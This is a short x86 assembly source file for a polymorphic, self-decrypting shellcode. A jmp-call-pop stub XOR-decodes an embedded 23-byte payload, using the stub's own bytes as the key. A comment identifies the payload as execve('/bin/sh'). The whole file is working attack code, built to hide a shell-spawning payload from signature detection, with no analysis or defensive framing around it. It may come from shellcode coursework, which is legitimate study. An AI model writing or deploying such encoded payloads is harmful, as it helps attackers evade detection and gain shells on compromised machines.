BITS 32
GLOBAL start

section .text

; This polymorphic shellcode uses its
; own code as the key

_start:
    jmp callback ; "jmp call pop" trick

main:
    pop edi ; [addr] cypher

    xor ebx, ebx ; [int] decrypter length
    mov bl, 38

    mov esi, edi
    sub esi, ebx ; [addr] _start

    xor ecx, ecx ; [int] counter

decrypt:
    cmp ecx, 23 ; counter == cyphertext len ?
    je  cypher  ; goto cypher

    xor edx, edx ; edx:eax is used with div
    mov eax, ecx ; tmp = counter
    div ebx      ; edx = counter % len

    mov al, [esi + edx] ; get key
    xor [edi + ecx], al ; decrypt cypher
    
    inc ecx     ; counter ++
    jmp decrypt

callback:
    call main

cypher: ; classic execve("/bin/sh", 0, 0)
    db 0xda, 0xcd, 0x6e, 0xf8, 0xea
    db 0x73, 0x76, 0xe1, 0xd1, 0x06
    db 0xad, 0x59, 0xa1, 0xac, 0x9b
    db 0x7e, 0x1a, 0x9d, 0xd2, 0x62
    db 0x82, 0x05, 0x77
